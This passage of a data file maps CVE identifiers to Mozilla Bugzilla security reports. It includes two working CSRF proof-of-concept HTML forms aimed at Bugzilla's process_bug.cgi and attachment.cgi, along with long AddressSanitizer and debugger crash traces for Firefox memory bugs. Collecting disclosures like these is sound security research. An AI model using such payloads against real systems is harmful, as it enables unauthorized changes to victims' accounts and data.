mallocs by size class: 8:502183; 9:54311; 10:19963; 11:14517; 12:3446; 13:3628; 14:1128; 15:394; 16:1111; 17:100; 18:17; 19:8; 20:4; frees by size class: 8:202047; 9:33734; 10:12283; 11:11046; 12:2220; 13:2726; 14:536; 15:272; 16:944; 17:90; 18:11; 19:4; 20:3; rfrees by size class: Stats: malloc large: 129 small slow: 2773 ==14198== ABORTING"
      }
    ],
    "CVE-2013-1733": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=911593",
        "title": "[SECURITY] CSRF in process_bug.cgi",
        "description": "PoC: (Changes in the bug with ID 21951 - landfill.bugzilla.org) <html> <!-- CSRF PoC - generated by Burp Suite Professional --> <body> <form action=\"https://landfill.bugzilla.org/bugzilla-tip/process_bug.cgi\" method=\"POST\"> <input type=\"hidden\" name=\"delta&#95;ts\" value=\"aaaaaaaaaaaaaaaaaaaaa\" /> <input type=\"hidden\" name=\"longdesclength\" value=\"1\" /> <input type=\"hidden\" name=\"id\" value=\"21951\" /> <input type=\"hidden\" name=\"token\" value=\"aaaaaaaaaaaaaaaaaaaaa\" /> <input type=\"hidden\" name=\"alias\" value=\"aaaaaaaaa\" /> <input type=\"hidden\" name=\"short&#95;desc\" value=\"TEST2\" /> <input type=\"hidden\" name=\"product\" value=\"FoodReplicator\" /> <input type=\"hidden\" name=\"classification\" value=\"Unclassified\" /> <input type=\"hidden\" name=\"component\" value=\"renamed&#32;component\" /> <input type=\"hidden\" name=\"rep&#95;platform\" value=\"PC\" /> <input type=\"hidden\" name=\"op&#95;sys\" value=\"Linux\" /> <input type=\"hidden\" name=\"priority\" value=\"P2\" /> <input type=\"hidden\" name=\"bug&#95;severity\" value=\"normal\" /> <input type=\"hidden\" name=\"target&#95;milestone\" value=\"&#45;&#45;&#45;\" /> <input type=\"hidden\" name=\"assigned&#95;to\" value=\"mybutt&#64;inyourface&#46;com\" /> <input type=\"hidden\" name=\"qa&#95;contact\" value=\"\" /> <input type=\"hidden\" name=\"bug&#95;file&#95;loc\" value=\"\" /> <input type=\"hidden\" name=\"status&#95;whiteboard\" value=\"\" /> <input type=\"hidden\" name=\"keywords\" value=\"\" /> <input type=\"hidden\" name=\"tag\" value=\"\" /> <input type=\"hidden\" name=\"dependson\" value=\"\" /> <input type=\"hidden\" name=\"blocked\" value=\"\" /> <input type=\"hidden\" name=\"newcc\" value=\"\" /> <input type=\"hidden\" name=\"defined&#95;bug&#95;ignored\" value=\"1\" /> <input type=\"hidden\" name=\"see&#95;also\" value=\"\" /> <input type=\"hidden\" name=\"cf&#95;large&#95;text\" value=\"\" /> <input type=\"hidden\" name=\"cf&#95;free&#95;text\" value=\"\" /> <input type=\"hidden\" name=\"defined&#95;cf&#95;mulitple&#95;select\" value=\"\" /> <input type=\"hidden\" name=\"cf&#95;drop&#95;down\" value=\"&#45;&#45;&#45;\" /> <input type=\"hidden\" name=\"cf&#95;date\" value=\"\" /> <input type=\"hidden\" name=\"cf&#95;bug&#95;id\" value=\"\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;8\" value=\"X\" /> <input type=\"hidden\" name=\"requestee&#95;type&#45;8\" value=\"\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;9\" value=\"X\" /> <input type=\"hidden\" name=\"requestee&#95;type&#45;9\" value=\"\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;11\" value=\"X\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;5\" value=\"X\" /> <input type=\"hidden\" name=\"requestee&#95;type&#45;5\" value=\"\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;10\" value=\"X\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;6\" value=\"X\" /> <input type=\"hidden\" name=\"requestee&#95;type&#45;6\" value=\"\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;12\" value=\"X\" /> <input type=\"hidden\" name=\"estimated&#95;time\" value=\"0&#46;0\" /> <input type=\"hidden\" name=\"work&#95;time\" value=\"0\" /> <input type=\"hidden\" name=\"remaining&#95;time\" value=\"0&#46;0\" /> <input type=\"hidden\" name=\"deadline\" value=\"\" /> <input type=\"hidden\" name=\"comment\" value=\"\" /> <input type=\"hidden\" name=\"bug&#95;status\" value=\"CONFIRMED\" /> <input type=\"hidden\" name=\"resolution\" value=\"FIXED\" /> <input type=\"hidden\" name=\"dup&#95;id\" value=\"\" /> <input type=\"submit\" value=\"Submit request\" /> </form> </body> </html>"
      }
    ],
    "CVE-2013-1734": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=913904",
        "title": "[SECURITY] CSRF when updating attachments",
        "description": "PoC: <html> <!-- CSRF PoC - generated by Burp Suite Professional --> <body> <form action=\"https://landfill.bugzilla.org/bugzilla-tip/attachment.cgi\" method=\"POST\"> <input type=\"hidden\" name=\"id\" value=\"3100\" /> <input type=\"hidden\" name=\"action\" value=\"update\" /> <input type=\"hidden\" name=\"contenttypemethod\" value=\"manual\" /> <input type=\"hidden\" name=\"delta&#95;ts\" value=\"xxxxxx\" /> <input type=\"hidden\" name=\"token\" value=\"xxxxx\" /> <input type=\"hidden\" name=\"description\" value=\"asdasd123\" /> <input type=\"hidden\" name=\"filename\" value=\"file&#95;21994&#46;txt\" /> <input type=\"hidden\" name=\"contenttypeentry\" value=\"text&#47;plain\" /> <input type=\"hidden\" name=\"comment\" value=\"asd\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;4\" value=\"X\" /> <input type=\"hidden\" name=\"requestee&#95;type&#45;4\" value=\"\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;1\" value=\"X\" /> <input type=\"hidden\" name=\"requestee&#95;type&#45;1\" value=\"\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;2\" value=\"X\" /> <input type=\"hidden\" name=\"requestee&#95;type&#45;2\" value=\"\" /> <input type=\"hidden\" name=\"flag&#95;type&#45;3\" value=\"X\" /> <input type=\"submit\" value=\"Submit request\" /> </form> </body> </html>"
      }
    ],
    "CVE-2013-1735": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=898871",
        "title": "ASAN heap-use-after-free in mozilla::layout::ScrollbarActivity",
        "description": "The attached testcase crashes the firefox ASAN build with following ASAN output. The testcase is attached as a zip archive, as it requires several files. ================================================================ ==45947==ERROR: AddressSanitizer: heap-use-after-free on address 0x625001110a98 at pc 0x7feca0144595 bp 0x7fffdd1e1ff0 sp 0x7fffdd1e1fe8 READ of size 8 at 0x625001110a98 thread T0 #0 0x7feca0144594 in nsCOMPtr<mozilla::layout::ScrollbarActivity>::get() const /builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/layout/generic/../../dist/include/nsCOMPtr.h:800:0 #1 0x7feca0144594 in nsCOMPtr<mozilla::layout::ScrollbarActivity>::operator mozilla::layout::ScrollbarActivity*() const /builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/layout/generic/../../dist/include/nsCOMPtr.h:813:0 #2 0x7feca0144594 in nsGfxScrollFrameInner::SetCoordAttribute(nsIContent*, nsIAtom*, int) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:3861:0 #3 0x7feca013bbb4 in nsGfxScrollFrameInner::UpdateScrollbarPosition() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:2941:0 #4 0x7feca0136fbe in nsGfxScrollFrameInner::ScrollToImpl(nsPoint, nsRect const&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:2012:0 #5 0x7feca013886c in nsGfxScrollFrameInner::ScrollToWithOrigin(nsPoint, nsIScrollableFrame::ScrollMode, nsIAtom*, nsRect const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:1651:0 #6 0x7feca0028e0c in nsGfxScrollFrameInner::ScrollTo(nsPoint, nsIScrollableFrame::ScrollMode, nsRect const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.h:172:0 #7 0x7feca0028e0c in nsHTMLScrollFrame::ScrollTo(nsPoint, nsIScrollableFrame::ScrollMode, nsRect const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.h:524:0 #8 0x7feca0028e0c in non-virtual thunk to nsHTMLScrollFrame::ScrollTo(nsPoint, nsIScrollableFrame::ScrollMode, nsRect const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:4099:0 #9 0x7feca0ef0f66 in mozilla::dom::ImageDocument::ScrollImageTo(int, int, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:379:0 #10 0x7feca0ef07d1 in mozilla::dom::ImageDocument::ShrinkToFit() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:336:0 #11 0x7feca0ef532b in mozilla::dom::ImageDocument::CheckOverflowing(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:636:0 #12 0x7feca0ef4857 in mozilla::dom::ImageDocument::HandleEvent(nsIDOMEvent*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:537:0 #13 0x7feca0ef545c in non-virtual thunk to mozilla::dom::ImageDocument::HandleEvent(nsIDOMEvent*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:565:0 #14 0x7feca0a9d6a2 in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener> const&, nsIDOMEvent*, mozilla::dom::EventTarget*, nsCxPusher*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventListenerManager.cpp:941:0 #15 0x7feca0a9e3e8 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*, nsCxPusher*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventListenerManager.cpp:1012:0 #16 0x7feca0a90577 in nsEventTargetChainItem::CurrentTarget() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventListenerManager.h:328:0 #17 0x7feca0a90577 in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, ELMCreationDetector&, nsCxPusher*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventDispatcher.cpp:221:0 #18 0x7feca0a8f4f1 in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, nsDispatchingCallback*, ELMCreationDetector&, nsCxPusher*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventDispatcher.cpp:342:0 #19 0x7feca0a93753 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventDispatcher.cpp:644:0 #20 0x7fec9ff969ad in PresShell::FireResizeEvent() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:1956:0 #21 0x7fec9ffa9fbc in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:3807:0 #22 0x7fec9ff9a635 in PresShell::HandlePostedReflowCallbacks(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:3711:0 #23 0x7fec9ff9a635 in PresShell::DidDoReflow(bool, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:7663:0 #24 0x7fec9ff97768 in PresShell::ResizeReflowIgnoreOverride(int, int) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:1885:0 #25 0x7feca1229c1f in nsViewManager::DoSetWindowDimensions(int, int) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/view/src/nsViewManager.cpp:197:0 #26 0x7feca1229c1f in nsViewManager::SetWindowDimensions(int, int) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/view/src/nsViewManager.cpp:217:0 #27 0x7fec9ff1dbd7 in nsDocumentViewer::SetBounds(nsIntRect const&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsDocumentViewer.cpp:1874:39 #28 0x7fec9ff1dc67 in nsDocumentViewer::SetBounds(nsIntRect const&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsDocumentViewer.cpp:1886:0 #29 0x7feca1fd913a in nsDocShell::SetPositionAndSize(int, int, int, int, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/docshell/base/nsDocShell.cpp:5101:0 #30 0x7feca1fd913a in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/docshell/base/nsDocShell.cpp:5105:0 #31 0x7feca0822249 in nsFrameLoader::UpdateBaseWindowPositionAndSize(nsSubDocumentFrame*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsFrameLoader.cpp:1884:0 #32 0x7feca0821d97 in nsFrameLoader::UpdatePositionAndSize(nsSubDocumentFrame*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsFrameLoader.cpp:1858:0 #33 0x7feca01eb7da in nsSubDocumentFrame::ReflowFinished() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsSubDocumentFrame.cpp:692:0 #34 0x7feca01eb7da in non-virtual thunk to nsSubDocumentFrame::ReflowFinished() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsSubDocumentFrame.cpp:701:0 #35 0x7fec9ff9a5cf in PresShell::HandlePostedReflowCallbacks(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:3702:0 #36 0x7fec9ff9a5cf in PresShell::DidDoReflow(bool, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:7663:0 #37 0x7fec9ffaaf6e in PresShell::ProcessReflowCommands(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:7996:0 #38 0x7fec9ffaa708 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:3896:0 #39 0x7feca07bcb88 in nsDocument::FlushPendingNotifications(mozFlushType) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsDocument.cpp:7087:0 #40 0x7feca07bc98e in nsDocument::FlushPendingNotifications(mozFlushType) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsDocument.cpp:7065:0 #41 0x7feca202fba5 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/uriloader/base/nsDocLoader.cpp:709:0 #42 0x7feca203159a in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/uriloader/base/nsDocLoader.cpp:639:0 #43 0x7feca2031e49 in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/uriloader/base/nsDocLoader.cpp:642:0 #44 0x7fec9f6b4176 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/netwerk/base/src/nsLoadGroup.cpp:684:0 #45 0x7feca07c33aa in nsDocument::DoUnblockOnload() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsDocument.cpp:7967:0 #46 0x7feca07c2eaf in nsDocument::UnblockOnload(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsDocument.cpp:7895:0 #47 0x7feca07a1492 in nsDocument::DispatchContentLoadedEvents() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsDocument.cpp:4685:0 #48 0x7feca07ea2ac in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/content/base/src/../../../dist/include/nsThreadUtils.h:350:0 #49 0x7fec9f47e2ea in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/xpcom/threads/nsThread.cpp:621:0 #50 0x7fec9f3a74f6 in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:238:0 #51 0x7fec9e294011 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/ipc/glue/MessagePump.cpp:81:0 #52 0x7fec9f5a6533 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/ipc/chromium/src/base/message_loop.cc:219:0 #53 0x7fec9f5a6533 in MessageLoop::RunHandler() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/ipc/chromium/src/base/message_loop.cc:212:0 #54 0x7fec9f5a6533 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/ipc/chromium/src/base/message_loop.cc:186:0 #55 0x7feca27a8bec in nsBaseAppShell::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/widget/xpwidgets/nsBaseAppShell.cpp:163:0 #56 0x7feca21c9abe in nsAppStartup::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/toolkit/components/startup/nsAppStartup.cpp:269:0 #57 0x7fec9df31730 in XREMain::XRE_mainRun() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/toolkit/xre/nsAppRunner.cpp:3858:0 #58 0x7fec9df32695 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/toolkit/xre/nsAppRunner.cpp:3926:0 #59 0x7fec9df335cb in XRE_main /builds/slave/m-cen-l64-asan-ntly-0000000000/build/toolkit/xre/nsAppRunner.cpp:4128:0 #60 0x459add in do_main(int, char**, nsIFile*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/browser/app/nsBrowserApp.cpp:272:0 #61 0x459add in main /builds/slave/m-cen-l64-asan-ntly-0000000000/build/browser/app/nsBrowserApp.cpp:632:0 #62 0x7fecacadaea4 in ?? ??:0 #63 0x458f5c in _start ??:? 0x625001110a98 is located 4504 bytes inside of 8192-byte region [0x62500110f900,0x625001111900) freed by thread T0 here: #0 0x445e65 in __interceptor_free _asan_rtl_:0 #1 0x7fecaa10f7e3 in FreeArenaList /builds/slave/m-cen-l64-asan-ntly-0000000000/build/nsprpub/lib/ds/plarena.c:273:0 #2 0x7fecaa10f7e3 in PL_FinishArenaPool /builds/slave/m-cen-l64-asan-ntly-0000000000/build/nsprpub/lib/ds/plarena.c:313:0 #3 0x7fec9ff8cdd8 in PresShell::~PresShell() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nsPresShell.cpp:747:0 #4 0x7feca23bf03e in nsEditingSession::SetupEditorOnWindow(nsIDOMWindow*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/editor/composer/src/nsEditingSession.cpp:332:0 #5 0x7feca23bd390 in nsEditingSession::MakeWindowEditable(nsIDOMWindow*, char const*, bool, bool, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/editor/composer/src/nsEditingSession.cpp:168:0 #6 0x7feca0f1acc9 in nsHTMLDocument::EditingStateChanged() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/nsHTMLDocument.cpp:2871:0 #7 0x7feca0f36a7c in nsRunnableMethodImpl<void (nsHTMLDocument::*)(), true>::Run() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/content/html/document/src/../../../../dist/include/nsThreadUtils.h:350:0 #8 0x7feca063dc6c in ~nsAutoScriptBlocker /builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/content/base/src/../../../dist/include/nsContentUtils.h:2248:0 #9 0x7feca063dc6c in ~nsAutoScriptBlocker /builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/content/base/src/../../../dist/include/nsContentUtils.h:2247:0 #10 0x7feca063dc6c in mozilla::dom::Element::SetAttr(int, nsIAtom*, nsIAtom*, nsAString_internal const&, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/Element.cpp:1629:0 #11 0x7feca01444f1 in nsIContent::SetAttr(int, nsIAtom*, nsAString_internal const&, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/layout/generic/../../dist/include/nsIContent.h:350:0 #12 0x7feca01444f1 in nsGfxScrollFrameInner::SetCoordAttribute(nsIContent*, nsIAtom*, int) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:3859:0 #13 0x7feca013bbb4 in nsGfxScrollFrameInner::UpdateScrollbarPosition() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:2941:0 #14 0x7feca0136fbe in nsGfxScrollFrameInner::ScrollToImpl(nsPoint, nsRect const&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:2012:0 #15 0x7feca013886c in nsGfxScrollFrameInner::ScrollToWithOrigin(nsPoint, nsIScrollableFrame::ScrollMode, nsIAtom*, nsRect const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:1651:0 #16 0x7feca0028e0c in nsGfxScrollFrameInner::ScrollTo(nsPoint, nsIScrollableFrame::ScrollMode, nsRect const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.h:172:0 #17 0x7feca0028e0c in nsHTMLScrollFrame::ScrollTo(nsPoint, nsIScrollableFrame::ScrollMode, nsRect const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.h:524:0 #18 0x7feca0028e0c in non-virtual thunk to nsHTMLScrollFrame::ScrollTo(nsPoint, nsIScrollableFrame::ScrollMode, nsRect const*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsGfxScrollFrame.cpp:4099:0 #19 0x7feca0ef0f66 in mozilla::dom::ImageDocument::ScrollImageTo(int, int, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:379:0 #20 0x7feca0ef07d1 in mozilla::dom::ImageDocument::ShrinkToFit() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:336:0 #21 0x7feca0ef532b in mozilla::dom::ImageDocument::CheckOverflowing(bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:636:0 #22 0x7feca0ef545c in non-virtual thunk to mozilla::dom::ImageDocument::HandleEvent(nsIDOMEvent*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/ImageDocument.cpp:565:0 #23 0x7feca0a9e3e8 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*, nsCxPusher*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventListenerManager.cpp:1012:0 #24 0x7feca0a90577 in nsEventTargetChainItem::CurrentTarget() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventListenerManager.h:328:0 #25 0x7feca0a90577 in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, ELMCreationDetector&, nsCxPusher*) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nsEventDispatcher.cpp:221:0 previously allocated by thread T0 here: #0 0x445fa5 in malloc _asan_rtl_:0 #1 0x7fecaa10edca in PL_ArenaAllocate /builds/slave/m-cen-l64-asan-ntly-0000000000/build/nsprpub/lib/ds/plarena.c:200:0 Shadow bytes around the buggy address: 0x0c4a8021a100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a110: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a120: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a130: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a140: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c4a8021a150: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a160: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a170: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a190: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a8021a1a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==45947==ABORTING"
      }
    ],
    "CVE-2013-1736": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=906301",
        "title": "Memory corruption in nsGfxScrollFrameInner::IsLTR()",
        "description": "The attached testcase crashes Firefox stable and nightly. The testcase is attached in a zip file as it requires multiple files to trigger. The debugger output on windows: eax=0101020d ebx=00000000 ecx=00020000 edx=0000000f esi=0018e260 edi=0018e1d4 eip=645f875d esp=0018e148 ebp=0a154aa0 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210202 xul!nsGfxScrollFrameInner::IsLTR+0x1d: 645f875d 803801 cmp byte ptr [eax],1 ds:0023:0101020d=?? xul!nsGfxScrollFrameInner::IsLTR+0x1d xul!nsHTMLScrollFrame::ReflowContents+0x145 xul!nsHTMLScrollFrame::Reflow+0x210 xul!nsContainerFrame::ReflowChild+0x5a xul!ViewportFrame::Reflow+0x1e8 xul!PresShell::DoReflow+0x418 xul!PresShell::ProcessReflowCommands+0x166 xul!PresShell::FlushPendingNotifications+0x3ef xul!nsRefreshDriver::Tick+0x29f xul!mozilla::RefreshDriverTimer::Tick+0x102 xul!nsTimerImpl::Fire+0xe7 xul!nsThread::ProcessNextEvent+0x362 xul!NS_ProcessNextEvent+0x2e xul!mozilla::ipc::MessagePump::Run+0x46 xul!MessageLoop::RunHandler+0x51 xul!MessageLoop::Run+0x19 xul!nsBaseAppShell::Run+0x2c xul!nsAppShell::Run+0x14 xul!XREMain::XRE_mainRun+0x3a9 xul!XREMain::XRE_main+0xdc ASAN on Linux doesn't give us any further information: ASAN:SIGSEGV ================================================================= ==7971==ERROR: AddressSanitizer: SEGV on unknown address 0x0000dfff8000 (pc 0x7f58fb6e7943 sp 0x7fff44347e00 bp 0x7fff44347eb0 T0) AddressSanitizer can not provide additional info. #0 0x7f58fb6e7942 in nsGfxScrollFrameInner::IsLTR() const /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsGfxScrollFrame.cpp:3302:0 #1 0x7f58fb6ca4c3 in nsGfxScrollFrameInner::GetScrolledRectInternal(nsRect const&, nsSize const&) const /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsGfxScrollFrame.cpp:3983:0 #2 0x7f58fb6ca4c3 in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsGfxScrollFrame.cpp:574:0 #3 0x7f58fb6cc40a in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsGfxScrollFrame.cpp:783:0 #4 0x7f58fb64dad3 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsContainerFrame.cpp:970:0 #5 0x7f58fb7f8177 in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsViewportFrame.cpp:225:0 #6 0x7f58fb53d539 in PresShell::DoReflow(nsIFrame*, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsPresShell.cpp:7850:0 #7 0x7f58fb54eda8 in PresShell::ProcessReflowCommands(bool) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsPresShell.cpp:7991:0 #8 0x7f58fb54e66f in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsPresShell.cpp:3890:0 #9 0x7f58fb582704 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsRefreshDriver.cpp:1191:0 #10 0x7f58fb5889f0 in 